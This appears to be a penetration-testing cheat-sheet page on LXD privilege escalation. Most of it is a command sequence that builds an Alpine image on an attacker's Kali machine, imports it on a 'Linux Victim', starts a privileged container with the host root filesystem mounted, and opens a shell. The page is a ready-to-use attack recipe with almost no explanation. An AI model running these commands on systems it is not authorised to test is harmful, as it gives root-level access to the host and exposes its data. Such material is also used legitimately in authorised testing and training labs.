# Containers

### LXD Privilege Escalation

```bash
#Download on your Kali Machine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

#Send the .tar.gz created on Kali to Linux Victim & use this commands
lxc image import ./yourfilename.tar.gz --alias myimage
lxc image list (this should show you your image got loaded)
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

{% embed url="https://github.com/saghul/lxd-alpine-builder.git" %}
LXD Alpine Linux image builder
{% endembed %}
